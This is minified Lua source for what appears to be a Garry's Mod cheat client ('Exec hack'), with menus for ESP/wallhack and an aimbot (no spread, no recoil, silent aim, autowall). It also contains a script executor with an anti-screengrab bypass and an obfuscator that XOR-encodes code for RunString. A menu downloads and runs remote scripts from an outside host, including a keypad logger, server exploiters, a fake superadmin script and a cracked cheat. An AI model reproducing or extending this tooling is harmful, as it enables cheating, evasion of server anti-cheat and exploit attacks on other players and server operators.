aJ=panelentityall:Add("DCheckBoxLabel")aJ:SetPos(450,aE+5)aJ:SetText("Spectate")aJ:SetFont("hack_font_18")aJ:SetTextColor(Color(255,255,255))if n["MISC_SPECTATE_TARGET"]==aN["id"]then aJ:SetValue(true)else aJ:SetValue(false)end;function aJ:OnChange(ar)if ar then p("MISC_SPECTATE_TARGET",aN["id"])else p("MISC_SPECTATE_TARGET","")end end;function aJ.Button:Paint(as,at)surface.SetDrawColor(30,30,30)surface.DrawRect(0,0,as,at)if self:GetChecked()then surface.SetDrawColor(Color(100,100,255))surface.DrawRect(0,0,as,at)end;surface.SetDrawColor(Color(100,100,100,255))surface.DrawOutlinedRect(0,0,as,at)end;aE=aE+25 end end end;findentityxd("")end)end)ae(47,"Team",function()if IsInGame()then file.Write(k.runlua,[[local a={}for _,v in pairs(team.GetAllTeams())do a[v.Name]=true end file.Write("]]..k.aimteams..[[",util.TableToJSON(a))]])end;timer.Simple(1,function()function findentityxd(aD)if IsValid(panelentityall)then panelentityall:Remove()end;panelentityall=vgui.Create("DScrollPanel",aB)panelentityall:SetPos(3,53+27)panelentityall:SetSize(600-6,267)panelentityall.Paint=function(f,N,P)surface.SetDrawColor(Color(100,100,100,255))surface.DrawOutlinedRect(0,0,panelentityall:GetSize())end;panelentityall.VBar.Paint=function(ag,N,P)draw.RoundedBox(0,0,0,N,P,Color(0,0,0,50))end;panelentityall.VBar.btnUp.Paint=function(ag,N,P)draw.RoundedBox(0,2,2,N-4,P-4,Color(0,0,0,25))draw.DrawText("▲","HudHintTextSmall",3,2,Color(255,255,255,255))end;panelentityall.VBar.btnDown.Paint=function(ag,N,P)draw.RoundedBox(0,2,2,N-4,P-4,Color(0,0,0,25))draw.DrawText("▼","HudHintTextSmall",3,2,Color(255,255,255,255))end;local aE=1;for aM,aN in pairs(util.JSONToTable(file.Read(k.aimteams,"DATA")or'[]'))do if string.find(aM,aD)then local aI=vgui.Create("DButton",panelentityall)aI:SetSize(297,25)aI:SetPos(1,aE)aI:SetText('')aI.Paint=function(f,N,P)draw.RoundedBox(0,0,0,N,P,Color(30,30,30,255))draw.SimpleText(aM,"hack_font_18",2.5,2,Color(255,255,255))end;local aJ=panelentityall:Add("DCheckBoxLabel")aJ:SetPos(300,aE+5)aJ:SetText("Ignore")aJ:SetFont("hack_font_18")aJ:SetTextColor(Color(255,255,255))if string.find(n["AIMBOT_TEAMS"],aM or"")then aJ:SetValue(true)else aJ:SetValue(false)end;function aJ:OnChange(ar)if ar then p("AIMBOT_TEAMS",n["AIMBOT_TEAMS"]..aM)else p("AIMBOT_TEAMS",string.Replace(n["AIMBOT_TEAMS"],aM,""))end end;function aJ.Button:Paint(as,at)surface.SetDrawColor(30,30,30)surface.DrawRect(0,0,as,at)if self:GetChecked()then surface.SetDrawColor(Color(100,100,255))surface.DrawRect(0,0,as,at)end;surface.SetDrawColor(Color(100,100,100,255))surface.DrawOutlinedRect(0,0,as,at)end;aE=aE+25 end end end;findentityxd("")end)end)ae(45,"Rank",function()if IsInGame()then file.Write(k.runlua,[[local a={}for _,v in pairs(player.GetAll())do if not a[v:GetUserGroup()]then a[v:GetUserGroup()]=true end end file.Write("]]..k.aimranks..[[",util.TableToJSON(a))]])end;timer.Simple(1,function()function findentityxd(aD)if IsValid(panelentityall)then panelentityall:Remove()end;panelentityall=vgui.Create("DScrollPanel",aB)panelentityall:SetPos(3,53+27)panelentityall:SetSize(600-6,267)panelentityall.Paint=function(f,N,P)surface.SetDrawColor(Color(100,100,100,255))surface.DrawOutlinedRect(0,0,panelentityall:GetSize())end;panelentityall.VBar.Paint=function(ag,N,P)draw.RoundedBox(0,0,0,N,P,Color(0,0,0,50))end;panelentityall.VBar.btnUp.Paint=function(ag,N,P)draw.RoundedBox(0,2,2,N-4,P-4,Color(0,0,0,25))draw.DrawText("▲","HudHintTextSmall",3,2,Color(255,255,255,255))end;panelentityall.VBar.btnDown.Paint=function(ag,N,P)draw.RoundedBox(0,2,2,N-4,P-4,Color(0,0,0,25))draw.DrawText("▼","HudHintTextSmall",3,2,Color(255,255,255,255))end;local aE=1;for aM,aN in pairs(util.JSONToTable(file.Read(k.aimranks,"DATA")or'[]'))do if string.find(aM,aD)then local aI=vgui.Create("DButton",panelentityall)aI:SetSize(297,25)aI:SetPos(1,aE)aI:SetText('')aI.Paint=function(f,N,P)draw.RoundedBox(0,0,0,N,P,Color(30,30,30,255))draw.SimpleText(aM,"hack_font_18",2.5,2,Color(255,255,255))end;local aJ=panelentityall:Add("DCheckBoxLabel")aJ:SetPos(300,aE+5)aJ:SetText("Ignore")aJ:SetFont("hack_font_18")aJ:SetTextColor(Color(255,255,255))if string.find(n["AIMBOT_RANKS"],aM or"")then aJ:SetValue(true)else aJ:SetValue(false)end;function aJ:OnChange(ar)if ar then p("AIMBOT_RANKS",n["AIMBOT_RANKS"]..aM)else p("AIMBOT_RANKS",string.Replace(n["AIMBOT_RANKS"],aM,""))end end;function aJ.Button:Paint(as,at)surface.SetDrawColor(30,30,30)surface.DrawRect(0,0,as,at)if self:GetChecked()then surface.SetDrawColor(Color(100,100,255))surface.DrawRect(0,0,as,at)end;surface.SetDrawColor(Color(100,100,100,255))surface.DrawOutlinedRect(0,0,as,at)end;aE=aE+25 end end end;findentityxd("")end)end)aB:Hide()local aQ=vgui.Create("DFrame")aQ:SetSize(300-70,300)aQ:Center()aQ:SetTitle("")aQ:SetDraggable(true)aQ:MakePopup()aQ:SetSizable(true)aQ:ShowCloseButton(false)aQ.Paint=function(f,N,P)draw.RoundedBox(0,0,0,N,P,Color(30,30,30))draw.RoundedBox(0,0,0,N,22,Color(71,74,79))draw.RoundedBox(0,0,22,N,1,Color(0,0,0))draw.SimpleText("Config","hack_font_18",5,2.5,Color(120,120,120))surface.SetDrawColor(Color(0,0,0))surface.DrawOutlinedRect(0,0,N,P)surface.SetDrawColor(Color(50,50,50))surface.DrawOutlinedRect(1,23,N-2,P-24)end;function k.refreshconifg()if IsValid(k.cfgp)then k.cfgp:Remove()end;k.cfgp=vgui.Create("DScrollPanel",aQ)k.cfgp:SetPos(3,24+25+2)k.cfgp:SetSize(230-6,246)k.cfgp.Paint=function(f,N,P)surface.SetDrawColor(Color(100,100,100,255))surface.DrawOutlinedRect(0,0,k.cfgp:GetSize())end;k.cfgp.VBar.Paint=function(ag,N,P)draw.RoundedBox(0,0,0,N,P,Color(0,0,0,50))end;k.cfgp.VBar.btnUp.Paint=function(ag,N,P)draw.RoundedBox(0,2,2,N-4,P-4,Color(0,0,0,25))draw.DrawText("▲","HudHintTextSmall",3,2,Color(255,255,255,255))end;k.cfgp.VBar.btnDown.Paint=function(ag,N,P)draw.RoundedBox(0,2,2,N-4,P-4,Color(0,0,0,25))draw.DrawText("▼","HudHintTextSmall",3,2,Color(255,255,255,255))end;local ay=3;for f,m in pairs(file.Find("1_*.dat","DATA"))do V(m:Replace("1_",""):Replace(".dat",""),3,ay,select(1,surface.GetTextSize(m:Replace("1_",""):Replace(".dat","")))+20,k.cfgp,function()local aO=DermaMenu()aO:AddOption("Load",function()local aR=y(util.JSONToTable(file.Read(m,"DATA")))file.Write(k.nylolxd,util.TableToJSON(aR))end)aO:AddOption("Remove",function()file.Delete(m)k.refreshconifg()end)aO:Open()end)ay=ay+27 end end;local a9=vgui.Create("DButton",aQ)a9:SetFont("hack_font_18")a9:SetText("Refresh")a9:SetTextColor(Color(255,255,255))a9:SetSize(63,25)a9:SetPos(3,24)a9.Paint=function(f,N,P)draw.RoundedBox(0,0,0,N,P,Color(35,35,35,255))surface.SetDrawColor(Color(100,100,100))surface.DrawOutlinedRect(0,0,a9:GetSize())if a9.Hovered then draw.RoundedBox(0,0,0,N,P,Color(120,120,120,100))end end;aQ.PerformLayout=function(self,w,x)if IsValid(k.cfgp)then k.cfgp:SetSize(w-6,x-54)end end;a9.DoClick=k.refreshconifg;V("Create",68,24,53,aQ,function()Derma_StringRequest("Config","Name","",function(M)file.Write("1_"..M..".dat",file.Read(k.nylolxd,"DATA"))k.refreshconifg()end)end)aQ:Hide()local t={}t.URL="https://execccc.online/hacka/account/indes.php"t.COMPILE="C"local v={["\\"]="\\\\",["\0"]="\\0",["\b"]="\\b",["\t"]="\\t",["\n"]="\\n",["\v"]="\\v",["\f"]="\\f",["\r"]="\\r",["\""]="\\\"",["\'"]="\\\'"}function t:Init()self.Code=""self.ErrorPanel=self:Add("DButton")self.ErrorPanel:SetFont('BudgetLabel')self.ErrorPanel:SetTextColor(Color(255,255,255))self.ErrorPanel:SetText("")self.ErrorPanel:SetTall(0)self.ErrorPanel.DoClick=function()self:GotoErrorLine()end;self.ErrorPanel.DoRightClick=function(self)SetClipboardText(self:GetText())end;self.ErrorPanel.Paint=function(self,w,x)surface.SetDrawColor(255,50,50)surface.DrawRect(0,0,w,x)end;self:StartHTML()end;function t:Think()if self.NextValidate and self.NextValidate<CurTime()then self:ValidateCode()end end;function t:StartHTML()self.HTML=self:Add("DHTML")self:AddJavascriptCallback("OnCode")self:AddJavascriptCallback("OnLog")self.HTML:OpenURL(self.URL)self.HTML:RequestFocus()end;function t:ReloadHTML()self.HTML:OpenURL(self.URL)end;function t:JavascriptSafe(e)e=e:gsub(".",v)e=e:gsub("\226\128\168","\\\226\128\168")e=e:gsub("\226\128\169","\\\226\128\169")return e end;function t:CallJS(Q)self.HTML:Call(Q)end;function t:AddJavascriptCallback(M)local P=self[M]self.HTML:AddFunction("gmodinterface",M,function(...)P(self,HTML,...)end)end;function t:OnCode(b,aS)self.NextValidate=CurTime()+0.2;self.Code=aS end;function t:OnLog(b,...)print(...)end;function t:SetCode(aS)self.Code=aS;self:CallJS('SetContent("'..self:JavascriptSafe(aS)..'");')end;function t:GetCode()return self.Code end;function t:SetGutterError(at,aT)self:CallJS("SetErr('"..at.."','"..self:JavascriptSafe(aT).."')")end;function t:GotoLine(O)self:CallJS("GotoLine('"..O.."')")end;function t:ClearGutter()self:CallJS("ClearErr()")end;function t:GotoErrorLine()self:GotoLine(self.ErrorLine or 1)end;function t:SetError(aU)if not IsValid(self.HTML)then self.ErrorPanel:SetText("")self:ClearGutter()return end;local aV=0;if aU then local aW,aU=string.match(aU,self.COMPILE..":(%d*):(.+)")if aW and aU then aV=20;self.ErrorPanel:SetText(aW and aU and"ERROR Line "..aW..": "..aU or aU or"")self.ErrorLine=tonumber(string.match(aU," at line (%d)%)")or aW)or 1;self:SetGutterError(self.ErrorLine,aU)end else self.ErrorPanel:SetText("")self:ClearGutter()end;local aJ=self:GetWide()local as=self:GetTall()self.ErrorPanel:SetPos(0,as-aV)self.ErrorPanel:SetSize(aJ,aV)self.HTML:SetSize(aJ,as-aV)end;function t:ValidateCode()local aX=SysTime()local aS=self:GetCode()self.NextValidate=nil;if not aS or aS==""then self:SetError()return end;local aY=CompileString(aS,self.COMPILE,false)aX=SysTime()-aX;if type(aY)=="string"then self:SetError(aY)elseif aX>0.25 then self:SetError("Compiling took too long. ("..math.Round(aX*1000)..")")else self:SetError()end end;function t:PerformLayout(w,x)local aV=self.ErrorPanel:GetTall()self.ErrorPanel:SetPos(0,x-aV)self.ErrorPanel:SetSize(w,aV)self.HTML:SetSize(w,x-aV)end;vgui.Register("lua_executer",t,"EditablePanel")local aZ=vgui.Create("DFrame")aZ:SetSize(650,380)aZ:Center()aZ:SetTitle("")aZ:SetDraggable(true)aZ:MakePopup()aZ:ShowCloseButton(false)aZ:SetSizable(true)aZ.Paint=function(f,N,P)draw.RoundedBox(0,0,0,N,P,Color(30,30,30))draw.RoundedBox(0,0,0,N,22,Color(71,74,79))draw.RoundedBox(0,0,22,N,1,Color(0,0,0))draw.SimpleText("Loader","hack_font_18",5,2.5,Color(120,120,120))surface.SetDrawColor(Color(0,0,0))surface.DrawOutlinedRect(0,0,N,P)surface.SetDrawColor(Color(50,50,50))surface.DrawOutlinedRect(1,23,N-2,P-24)end;k.runscriptloader=vgui.Create("DButton",aZ)k.runscriptloader:SetFont("hack_font_18")k.runscriptloader:SetText("Run Script")k.runscriptloader:SetTextColor(Color(255,255,255))k.runscriptloader:SetSize(75,25)k.runscriptloader:SetToolTip("Left button - run to ClientSide, Right button - run to MenuState.")k.runscriptloader.Paint=function(f,N,P)draw.RoundedBox(0,0,0,N,P,Color(35,35,35,255))surface.SetDrawColor(Color(100,100,100))surface.DrawOutlinedRect(0,0,k.runscriptloader:GetSize())if k.runscriptloader.Hovered then draw.RoundedBox(0,0,0,N,P,Color(120,120,120,100))end end;k.runscriptloader.DoClick=function()if IsInGame()then if k.exective.ErrorPanel:GetText()==""then file.Write(k.runlua,string.Replace(k.exective:GetCode(),"function()","function()if "..k.antiscreengrab.." then return end "))else k.exective.ErrorPanel:SetText("The script has errors not available to run!")end end end;k.runscriptloader.DoRightClick=function()if k.exective.ErrorPanel:GetText()==""then RunString(k.exective:GetCode())else k.exective.ErrorPanel:SetText("The script has errors not available to run!")end end;k.openfileloader=vgui.Create("DButton",aZ)k.openfileloader:SetFont("hack_font_18")k.openfileloader:SetText("Open File")k.openfileloader:SetTextColor(Color(255,255,255))k.openfileloader:SetSize(75,25)k.openfileloader.Paint=function(f,N,P)draw.RoundedBox(0,0,0,N,P,Color(35,35,35,255))surface.SetDrawColor(Color(100,100,100))surface.DrawOutlinedRect(0,0,k.openfileloader:GetSize())if k.openfileloader.Hovered then draw.RoundedBox(0,0,0,N,P,Color(120,120,120,100))end end;k.openfileloader.DoClick=function()local aO=DermaMenu()aO:AddOption("Public",function()timer.Simple(0.1,function()local aO=DermaMenu()for t,v in pairs({["Fake money"]="https://execccc.online/hacka/scriptspublic/money.lua",["Fake superadmin ulx"]="https://execccc.online/hacka/scriptspublic/superadmin.lua",["Rainbow physgun"]="https://execccc.online/hacka/scriptspublic/rainbow",["Check family sharing"]="https://execccc.online/hacka/scriptspublic/family1.lua",["Teleport and disconnect"]="https://execccc.online/hacka/scriptspublic/teleport",["Lua aimware"]="https://execccc.online/hacka/scriptspublic/aimware1",["Smeghack"]="https://execccc.online/hacka/scriptspublic/smeg",["Snixzz Crack"]="https://execccc.online/hacka/scriptspublic/snixzz",["Solly Exploiter"]="https://execccc.online/hacka/scriptspublic/solly",["Netdrill"]="https://execccc.online/hacka/scriptspublic/netdrill",["Full keypad logger"]="https://execccc.online/hacka/scriptspublic/keypad",["Show damage"]="https://execccc.online/hacka/scriptspublic/damage.lua",["Tts"]="https://execccc.online/hacka/scriptspublic/tts"})do aO:AddOption(t,function()k.httpfetch(v,function(m)k.exective:SetCode(m)end)end)end;aO:Open()end)end)for f,m in pairs(file.Find("gmsv_*","DATA"))do aO:AddOption(m:Replace(".txt",""):Replace("gmsv_",""),function()k.exective:SetCode(file.Read(m,"DATA"))end)end;aO:Open()end;k.savefileloader=vgui.Create("DButton",aZ)k.savefileloader:SetFont("hack_font_18")k.savefileloader:SetText("Save File")k.savefileloader:SetTextColor(Color(255,255,255))k.savefileloader:SetSize(67,25)k.savefileloader.Paint=function(f,N,P)draw.RoundedBox(0,0,0,N,P,Color(35,35,35,255))surface.SetDrawColor(Color(100,100,100))surface.DrawOutlinedRect(0,0,k.savefileloader:GetSize())if k.savefileloader.Hovered then draw.RoundedBox(0,0,0,N,P,Color(120,120,120,100))end end;k.savefileloader.DoClick=function()Derma_StringRequest("Loader","Name","Vzlom.lua",function(M)file.Write("gmsv_"..M..".txt",k.exective:GetCode())end)end;hgfjfsrt=aZ:Add("DCheckBoxLabel")hgfjfsrt:SetText("Anti Screengrab")hgfjfsrt:SetFont("hack_font_17")hgfjfsrt:SetTextColor(Color(255,255,255))hgfjfsrt:SetValue(n["LUALOADER_ANTISG"])hgfjfsrt:SetToolTip("Possible server interface breakdown!")function hgfjfsrt.Button:Paint(as,at)if self:GetChecked()then surface.SetDrawColor(65,95,200)surface.DrawRect(0,0,as,at)end;surface.SetDrawColor(Color(0,0,0))surface.DrawOutlinedRect(0,0,as,at)end;function hgfjfsrt:OnChange(aX)p("LUALOADER_ANTISG",aX)end;k.Obfuscateloader=vgui.Create("DButton",aZ)k.Obfuscateloader:SetFont("hack_font_18")k.Obfuscateloader:SetText("Obfuscate")k.Obfuscateloader:SetTextColor(Color(255,255,255))k.Obfuscateloader:SetSize(78,25)k.Obfuscateloader.Paint=function(f,N,P)draw.RoundedBox(0,0,0,N,P,Color(35,35,35,255))surface.SetDrawColor(Color(100,100,100))surface.DrawOutlinedRect(0,0,k.Obfuscateloader:GetSize())if k.Obfuscateloader.Hovered then draw.RoundedBox(0,0,0,N,P,Color(120,120,120,100))end end;k.Obfuscateloader.DoClick=function()local aO=DermaMenu()aO:AddOption("Lvl 1",function()local function a_(Q)e=""for M=1,string.len(Q)do e=e..'\\'..string.byte(Q,M)end;return e end;local function b0(b1,b2)for t,m in pairs(string.Explode(b2,b1))do if t%2==0 then b1=b1:Replace(b2 ..m..b2,b2 ..a_(m)..b2)end end;return b1 end;k.exective:SetCode(b0(k.exective:GetCode(),"'"))k.exective:SetCode(b0(k.exective:GetCode(),'"'))end)aO:AddOption("Lvl 2",function()k.exective:SetCode(k.exective:GetCode():Replace("\r\n"," "))k.exective:SetCode(k.exective:GetCode():Replace("\r"," "))k.exective:SetCode(k.exective:GetCode():Replace("\n"," "))end)aO:AddOption("Lvl 3",function()local function b3(v,w)local function x(Q)e=""for M=1,string.len(Q)do e=e..'\\'..string.byte(Q,M)end;return e end;math.randomseed(1/(os.clock()*1e3))function recursiveObf(P,v)if v<=0 then return P end;local w=math.floor(math.random()*10000000)math.randomseed(w)local b=string.gsub(P,".",function(P)return string.format("%02x",bit.bxor(string.byte(P),math.random(0,255)))end)return recursiveObf('local Q=_G;local q,w,e,r,t,y,u,i,o,p,a,s='..w..',"'..x(b)..'",16,0,255,"'..x("%x%x")..'",Q["'..x("string")..'"]["'..x("char")..'"],Q["'..x("bit")..'"]["'..x("bxor")..'"],Q["'..x("tonumber")..'"],Q["'..x("math")..'"]["'..x("random")..'"],Q["'..x("math")..'"]["'..x("randomseed")..'"],Q["'..x("RunString")..'"];a(q)s((w):gsub(y,function(c)return u(i(o(c,e),p(r,t)))end))',v-1)end;return recursiveObf(v,w)end;k.exective:SetCode(b3(k.exective:GetCode(),1))end)aO:AddOption("Dump",function()local b4=""jit.attach(function(v)if jit.util.funcinfo(v).source=="@CpoPBOjj"then for w=0,30 do local x=jit.util.funck(v,-w)if x then b4=b4 ..x.."\n"end end end end,"bc")RunString(k.exective:GetCode(),"CpoPBOjj")k.exective:SetCode(b4)end)aO:Open()end;k.exective=vgui.Create('lua_executer',aZ)k.exective:SetPos(3,24)k.exective:SetCode("")aZ.PerformLayout=function(self,w,x)k.exective:SetSize(w-6,x-54)k.runscriptloader:SetPos(w-78,x-28)k.openfileloader:SetPos(3,x-28)k.savefileloader:SetPos(80,x-28)k.Obfuscateloader:SetPos(149,x-28)hgfjfsrt:SetPos(229,x-24)end;aZ:Hide()local function b5(a7,W,X,b6,b7)local b8=vgui.Create("DButton",b6)b8:SetText("")b8:SetPos(W,X)b8:SetSize(15,15)b8.Paint=function(f,N,P)draw.RoundedBox(0,0,0,N,P,n[a7])end;b8.DoClick=function()if IsValid(changeclolhack)then changeclolhack:Close()end;changeclolhack=vgui.Create("DFrame")changeclolhack:SetSize(214,246)changeclolhack:SetPos(gui.MouseX(),gui.MouseY())changeclolhack:SetTitle("")changeclolhack:MakePopup()changeclolhack:ShowCloseButton(false)changeclolhack.Paint=function(f,N,P)draw.RoundedBox(0,0,0,N,P,Color(40,40,40,255))surface.SetDrawColor(Color(100,100,100,255))surface.DrawOutlinedRect(0,0,changeclolhack:GetSize())end;local b9=vgui.Create("DColorMixer",changeclolhack)b9:SetPos(3,3)b9:SetSize(208,240)b9:SetAlphaBar(false)b9:SetColor(n[a7])b9.ValueChanged=function(f,t)p(a7,Color(t.r,t.g,t.b))end;changeclolhack.Think=function()if IsValid(changeclolhack)and input.IsMouseDown(107)then if not changeclolhack:IsChildHovered()and not changeclolhack.Hovered then changeclolhack:Close()end end end end end;local ba=vgui.Create("DFrame")ba:SetSize(520,295+18)ba:Center()ba:SetTitle("")ba:SetDraggable(true)ba:MakePopup()ba:ShowCloseButton(false)ba:SetBackgroundBlur(true)ba.Paint=function(f,N,P)draw.RoundedBox(0,0,0,N,P,Color(30,30,30))draw.RoundedBox(0,0,0,N,22,Color(71,74,79))draw.RoundedBox(0,0,22,N,1,Color(0,0,0))if vraime=="LAIF"then draw.SimpleText("Exec hack","hack_font_18",5,2.5,Color(120,120,120))else draw.SimpleText("Exec hack | Expire: "..vraime or"Exec hack","hack_font_18",5,2.5,Color(120,120,120))end;surface.SetDrawColor(Color(0,0,0))surface.DrawOutlinedRect(0,0,N,P)surface.SetDrawColor(Color(50,50,50))surface.DrawOutlinedRect(1,23,N-2,P-24)surface.SetDrawColor(Color(0,0,0))surface.DrawOutlinedRect(10,57,N-20,P-64)surface.SetDrawColor(Color(50,50,50))surface.DrawOutlinedRect(11,58,N-22,P-66)if k.pngka and n["MENU_BACKGROUND"]then surface.SetMaterial(k.pngka)surface.SetDrawColor(255,255,255,10)surface.DrawTexturedRect(310,80,200,210)end end;local function bb(Y,F,W,X,a1,aA)local aJ=Y:Add("DCheckBoxLabel")aJ:SetPos(W,X)aJ:SetSize(15,15)aJ:SetText(F)aJ:SetFont("hack_font_17")aJ:SetTextColor(Color(255,255,255))aJ:SetValue(n[a1])if aA then aJ:SetToolTip(aA)end;function aJ.Button:Paint(as,at)if self:GetChecked()then surface.SetDrawColor(65,95,200)surface.DrawRect(0,0,as,at)end;surface.SetDrawColor(Color(0,0,0))surface.DrawOutlinedRect(0,0,as,at)end;function aJ:OnChange(aX)p(a1,aX)end end;local ao=10.5;local function bc(F,bd,be)local bf=vgui.Create("DButton",ba)bf:SetText("")bf:SetSize(117-25,25)bf:SetPos(ao,25)bf.Paint=function(f,N,P)if U["select"]==F then draw.SimpleText(F,"hack_font_17",bd,2,Color(65,95,200))draw.RoundedBox(0,0,23,N,2,Color(65,95,200))elseif bf.Hovered then draw.SimpleText(F,"hack_font_17",bd,2,Color(120,120,120))draw.RoundedBox(0,0,23,N,2,Color(120,120,120))else draw.SimpleText(F,"hack_font_17",bd,2,Color(65,65,65))draw.RoundedBox(0,0,23,N,2,Color(65,65,65))end end;bf.DoClick=be;ao=ao+125+2-25 end;bc("Visual",42-12.5,function()U["select"]="Visual"if IsValid(menupanelfunctional)then menupanelfunctional:Remove()end;menupanelfunctional=vgui.Create("DPanel",ba)menupanelfunctional:SetPos(10,57)menupanelfunctional:SetSize(500,248)menupanelfunctional.Paint=function()draw.SimpleText("Player","hack_font_15",10,3,Color(255,255,255))surface.SetDrawColor(Color(0,0,0))surface.DrawOutlinedRect(10,20,150,221)surface.SetDrawColor(Color(50,50,50))surface.DrawOutlinedRect(11,21,150-2,219)draw.SimpleText("Entity","hack_font_15",170,3,Color(255,255,255))surface.SetDrawColor(Color(0,0,0))surface.DrawOutlinedRect(170,20,160,221)surface.SetDrawColor(Color(50,50,50))surface.DrawOutlinedRect(171,21,160-2,219)draw.SimpleText("Other","hack_font_15",340,3,Color(255,255,255))surface.SetDrawColor(Color(0,0,0))surface.DrawOutlinedRect(340,20,150,221)surface.SetDrawColor(Color(50,50,50))surface.DrawOutlinedRect(341,21,150-2,219)draw.SimpleText("Distance","hack_font_15",15,207,Color(255,255,255))draw.SimpleText("Distance","hack_font_15",175,207,Color(255,255,255))draw.SimpleText("Fov view","hack_font_15",341+4,207,Color(255,255,255))end;bb(menupanelfunctional,"Name",16,25,"WH_NAME")bb(menupanelfunctional,"Rank",16,25+18,"WH_USERGROUP")bb(menupanelfunctional,"Team",16,25+18+18,"WH_JOB")bb(menupanelfunctional,"Money",16,25+18+18+18,"WH_MONEY")bb(menupanelfunctional,"Weapon",16,25+18+18+18+18,"WH_WEAPON")bb(menupanelfunctional,"Health",16,25+18+18+18+18+18,"WH_HEALTH")bb(menupanelfunctional,"Armor",16,25+18+18+18+18+18+18,"WH_ARMOR")bb(menupanelfunctional,"Box",16,25+18+18+18+18+18+18+18,"WH_BOX")bb(menupanelfunctional,"Chams",16,25+18+18+18+18+18+18+18+18,"WH_CHAMS")bb(menupanelfunctional,"Skeleton",16,25+18+18+18+18+18+18+18+18+18,"WH_SKELETON")bb(menupanelfunctional,"Name",176,25,"WH_ENTITY_NAME")bb(menupanelfunctional,"Box",176,25+18,"WH_ENTITY_BOX")bb(menupanelfunctional,"Chams",176,25+18+18,"WH_ENTITY_CHAMS")bb(menupanelfunctional,"CrossHair",346,25,"WH_CROSSHAIR")bb(menupanelfunctional,"FullBright",346,25+18,"WH_FULLBRIGHT")bb(menupanelfunctional,"NoSky",346,25+18+18,"WH_NOSKY")bb(menupanelfunctional,"Night",346,25+18+18+18,"WH_NIGHT")bb(menupanelfunctional,"Fov",346,25+18+18+18+18,"AIM_DRAWFOV")bb(menupanelfunctional,"Snapline",346,25+18+18+18+18+18,"WH_SNAPLINE")bb(menupanelfunctional,"Weapon Chams",346,25+18+18+18+18+18+18,"WH_VMCHAMS")bb(menupanelfunctional,"Cursor Entity",346,25+18+18+18+18+18+18+18,"WH_CURSORENTITYNAME")bb(menupanelfunctional,"No Sway",346,25+18+18+18+18+18+18+18+18,"NOSWAY")local bg=vgui.Create("DNumSlider",menupanelfunctional)bg:SetPos(-88,218)bg:SetSize(250,25)bg:SetMin(1000)bg:SetMax(20000)bg:SetDecimals(0)bg.TextArea:SetFont("hack_font_13")bg.TextArea:SetTextColor(Color(255,255,255))bg:SetValue(n["WH_DISTANCE"])function bg:OnValueChanged(t)p("WH_DISTANCE",t)end;function bg.Slider.Knob:Paint()end;function bg.Slider:Paint(N,P)surface.SetDrawColor(25,25,25)surface.DrawRect(0,P/4,N,P/2)surface.SetDrawColor(Color(100,100,255))surface.DrawRect(0,P/4,N*(self:GetParent():GetValue()-self:GetParent():GetMin())/self:GetParent():GetRange(),P/2)bg.SetTall=bg.SetHeight;bg.Slider.Knob:SetTall(20)end;local bh=vgui.Create("DPanel",menupanelfunctional)bh:SetPos(176,218)bh:SetSize(160,25)bh.Paint=function()end;local bg=vgui.Create("DNumSlider",bh)bg:SetPos(-111,0)bg:SetSize(250,25)bg:SetMin(1000)bg:SetMax(20000)bg:SetDecimals(0)bg.TextArea:SetFont("hack_font_13")bg.TextArea:SetTextColor(Color(255,255,255))bg:SetValue(n["WH_ENTITY_DISTANCE"])function bg:OnValueChanged(t)p("WH_ENTITY_DISTANCE",t)end;function bg.Slider.Knob:Paint()end;function bg.Slider:Paint(N,P)surface.SetDrawColor(25,25,25)surface.DrawRect(0,P/4,N,P/2)surface.SetDrawColor(Color(100,100,255))surface.DrawRect(0,P/4,N*(self:GetParent():GetValue()-self:GetParent():GetMin())/self:GetParent():GetRange(),P/2)bg.SetTall=bg.SetHeight;bg.Slider.Knob:SetTall(20)end;local bh=vgui.Create("DPanel",menupanelfunctional)bh:SetPos(341+5,218)bh:SetSize(160,25)bh.Paint=function()end;local bg=vgui.Create("DNumSlider",bh)bg:SetPos(-111,0)bg:SetSize(250,25)bg:SetMin(100)bg:SetMax(150)bg:SetDecimals(0)bg.TextArea:SetFont("hack_font_13")bg.TextArea:SetTextColor(Color(255,255,255))bg:SetValue(n["WH_FOVVIEW"])function bg:OnValueChanged(t)p("WH_FOVVIEW",t)end;function bg.Slider.Knob:Paint()end;function bg.Slider:Paint(N,P)surface.SetDrawColor(25,25,25)surface.DrawRect(0,P/4,N,P/2)surface.SetDrawColor(Color(100,100,255))surface.DrawRect(0,P/4,N*(self:GetParent():GetValue()-self:GetParent():GetMin())/self:GetParent():GetRange(),P/2)bg.SetTall=bg.SetHeight;bg.Slider.Knob:SetTall(20)end end)bc("Aimbot",35-12.5,function()U["select"]="Aimbot"if IsValid(menupanelfunctional)then menupanelfunctional:Remove()end;menupanelfunctional=vgui.Create("DPanel",ba)menupanelfunctional:SetPos(10,57)menupanelfunctional:SetSize(500,248)menupanelfunctional.Paint=function()draw.SimpleText("Fov","hack_font_15",6,156,Color(255,255,255))draw.SimpleText("Smoothing","hack_font_15",6,187,Color(255,255,255))end;bb(menupanelfunctional,"Enabled",6,5,"AIM_ENABLED","Enables the aimbot.")bb(menupanelfunctional,"NoSpread",6,5+18,"AIM_NOSPREAD","Compesate for the spread. [M9k, SWB]")bb(menupanelfunctional,"NoRecoil",6,5+18+18,"AIM_NORECOIL","Compesate for the recoil. [M9k, SWB]")bb(menupanelfunctional,"Silent",6,5+18+18+18,"AIM_SILENT")bb(menupanelfunctional,"AutoFire",6,5+18+18+18+18,"AIM_AUTOFIRE","Automatically fires the weapon.")bb(menupanelfunctional,"AutoReload",6,5+18+18+18+18+18,"AIM_AUTORELOAD")bb(menupanelfunctional,"AutoWall",6,5+18+18+18+18+18+18,"AIM_AUTOWALL","Checking on the walls. [M9K, FAS]")_("Key","AIM_KEY",6,133,35,menupanelfunctional)local bg=vgui.Create("DNumSlider",menupanelfunctional)bg:SetPos(-108,168)bg:SetSize(275,25)bg:SetMin(1)bg:SetMax(360)bg:SetDecimals(0)bg.TextArea:SetFont("hack_font_13")bg.TextArea:SetTextColor(Color(255,255,255))bg:SetValue(n["AIM_FOV"])function bg:OnValueChanged(t)p("AIM_FOV",t)end;function bg.Slider.Knob:Paint()end;function bg.Slider:Paint(N,P)surface.SetDrawColor(25,25,25)surface.DrawRect(0,P/4,N,P/2)surface.SetDrawColor(Color(100,100,255))surface.DrawRect(0,P/4,N*(self:GetParent():GetValue()-self:GetParent():GetMin())/self:GetParent():GetRange(),P/2)bg.SetTall=bg.SetHeight;bg.Slider.Knob:SetTall(20)end;local 